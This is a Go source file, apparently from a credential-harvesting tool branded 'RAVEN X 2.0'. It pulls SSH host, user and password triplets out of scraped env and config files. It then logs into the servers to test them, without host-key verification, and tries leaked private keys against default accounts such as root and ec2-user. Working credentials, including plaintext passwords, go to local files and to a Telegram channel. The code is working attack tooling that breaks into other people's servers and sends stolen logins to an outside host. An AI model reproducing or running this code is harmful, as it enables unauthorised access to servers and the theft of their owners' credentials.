package main

import (
	"fmt"
	"net"
	"regexp"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// extractSSHCredsFromText scans env/config file bodies for SSH/SFTP credential clusters.
// It looks for HOST + USER + PASS fields within an 8-line proximity window and
// tries to validate each complete triplet via CheckSSH.
func (a *AWSScanner) extractSSHCredsFromText(text, sourceURL string) {
	if !a.Config.ScanningFeatures.SSHScan {
		return
	}

	// Field patterns — key name variations commonly found in .env files
	hostPat := regexp.MustCompile(`(?i)(?:SSH_HOST|SFTP_HOST|VPS_HOST|SERVER_HOST|SSH_HOSTNAME|REMOTE_HOST)\s*[=:]\s*["']?([a-zA-Z0-9._-]{3,253})["']?`)
	portPat := regexp.MustCompile(`(?i)(?:SSH_PORT|SFTP_PORT|VPS_PORT|REMOTE_PORT)\s*[=:]\s*["']?(\d{1,5})["']?`)
	userPat := regexp.MustCompile(`(?i)(?:SSH_USER(?:NAME)?|SFTP_USER(?:NAME)?|VPS_USER|SERVER_USER|REMOTE_USER)\s*[=:]\s*["']?([a-zA-Z0-9._-]{1,64})["']?`)
	passPat := regexp.MustCompile(`(?i)(?:SSH_PASS(?:WORD)?|SFTP_PASS(?:WORD)?|VPS_PASS(?:WORD)?|SERVER_PASS(?:WORD)?|REMOTE_PASS(?:WORD)?)\s*[=:]\s*["']?([^\s"']{4,200})["']?`)

	lines := strings.Split(text, "\n")
	windowSize := 8

	for i, line := range lines {
		hm := hostPat.FindStringSubmatch(line)
		if hm == nil {
			continue
		}
		host := strings.TrimSpace(hm[1])
		if host == "" {
			continue
		}

		// Search window around this line for port/user/pass
		start := i - windowSize
		if start < 0 {
			start = 0
		}
		end := i + windowSize
		if end > len(lines) {
			end = len(lines)
		}
		window := strings.Join(lines[start:end], "\n")

		port := "22"
		if pm := portPat.FindStringSubmatch(window); pm != nil {
			port = pm[1]
		}

		um := userPat.FindStringSubmatch(window)
		pm2 := passPat.FindStringSubmatch(window)
		if um == nil || pm2 == nil {
			continue
		}
		user := strings.TrimSpace(um[1])
		pass := strings.TrimSpace(pm2[1])

		if user == "" || pass == "" || len(pass) < 4 {
			continue
		}

		triplet := fmt.Sprintf("%s:%s:%s:%s", host, port, user, pass)
		if _, loaded := a.KnownKeys.LoadOrStore("ssh:"+triplet, true); loaded {
			continue
		}

		a.logFound("SSH Credentials", fmt.Sprintf("%s@%s:%s", user, host, port), sourceURL)
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), triplet), "ssh_found.txt")

		globalCounters.mu.Lock()
		globalCounters.APIsFoundTotal++
		globalCounters.mu.Unlock()

		if a.Config.APIValidation.SSH {
			go a.CheckSSH(host, port, user, pass, sourceURL)
		}
	}
}

// CheckSSH validates SSH password credentials against host:port.
// Returns true only on successful authentication.
func (a *AWSScanner) CheckSSH(host, port, user, pass, sourceURL string) bool {
	if !a.Config.APIValidation.SSH {
		return false
	}

	pair := fmt.Sprintf("%s@%s:%s", user, host, port)
	if _, loaded := a.KnownKeys.LoadOrStore("sshvalid:"+pair, true); loaded {
		return false
	}

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}

	addr := net.JoinHostPort(host, port)
	conn, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return false
	}
	defer conn.Close()

	a.logValid("SSH", fmt.Sprintf("user=%s host=%s port=%s", user, host, port))
	a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s:%s", sanitizeSource(sourceURL), host, port, user, pass), "valid_ssh.txt")
	a.storeValidKeyLimit("SSH", pair, fmt.Sprintf("%s@%s:%s", user, host, port))

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🖥️ <b>SSH ACCESS</b>\n\n🌐 <b>Host:</b> <code>%s:%s</code>\n👤 <b>User:</b> <code>%s</code>\n🔐 <b>Pass:</b> <code>%s</code>\n🔗 <b>Source:</b> %s",
		host, port, user, pass, sourceURL)
	go a.sendTelegram(msg)
	return true
}

// CheckSSHPrivateKey attempts to use an exposed PEM private key to authenticate
// against the host inferred from sourceURL. Tries common default usernames.
func (a *AWSScanner) CheckSSHPrivateKey(pemBlock, sourceURL string) bool {
	if !a.Config.APIValidation.SSH {
		return false
	}

	signer, err := ssh.ParsePrivateKey([]byte(pemBlock))
	if err != nil {
		// Key is malformed or encrypted with passphrase — still saved, just can't auto-validate
		return false
	}

	// Extract host from sourceURL
	host := extractHostFromURL(sourceURL)
	if host == "" {
		return false
	}

	defaultUsers := []string{"root", "ubuntu", "admin", "ec2-user", "centos", "debian", "user", "www-data", "git"}

	for _, user := range defaultUsers {
		cfg := &ssh.ClientConfig{
			User: user,
			Auth: []ssh.AuthMethod{
				ssh.PublicKeys(signer),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
			Timeout:         8 * time.Second,
		}

		addr := net.JoinHostPort(host, "22")
		conn, err := ssh.Dial("tcp", addr, cfg)
		if err != nil {
			continue
		}
		conn.Close()

		a.logValid("SSH Key", fmt.Sprintf("user=%s host=%s (private key auth)", user, host))
		a.saveIntoFile(fmt.Sprintf("HOST:%s USER:%s\n%s", host, user, pemBlock), "valid_ssh_keys.txt")
		a.storeValidKeyLimit("SSH Key", host, fmt.Sprintf("%s@%s (private key)", user, host))

		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()

		msg := fmt.Sprintf("🔥 <b>RAVEN X 2.0 RESULT</b>\n━━━━━━━━━━━━━━━━━━\n🗝️ <b>SSH PRIVATE KEY WORKS</b>\n\n🌐 <b>Host:</b> <code>%s</code>\n👤 <b>User:</b> <code>%s</code>\n🔗 <b>Source:</b> %s",
			host, user, sourceURL)
		go a.sendTelegram(msg)
		return true
	}
	return false
}

// extractHostFromURL returns the hostname/IP from a URL string, stripping port.
func extractHostFromURL(rawURL string) string {
	s := strings.TrimPrefix(rawURL, "https://")
	s = strings.TrimPrefix(s, "http://")
	// Strip path
	if idx := strings.IndexByte(s, '/'); idx >= 0 {
		s = s[:idx]
	}
	// Strip port
	if host, _, err := net.SplitHostPort(s); err == nil {
		return host
	}
	return s
}
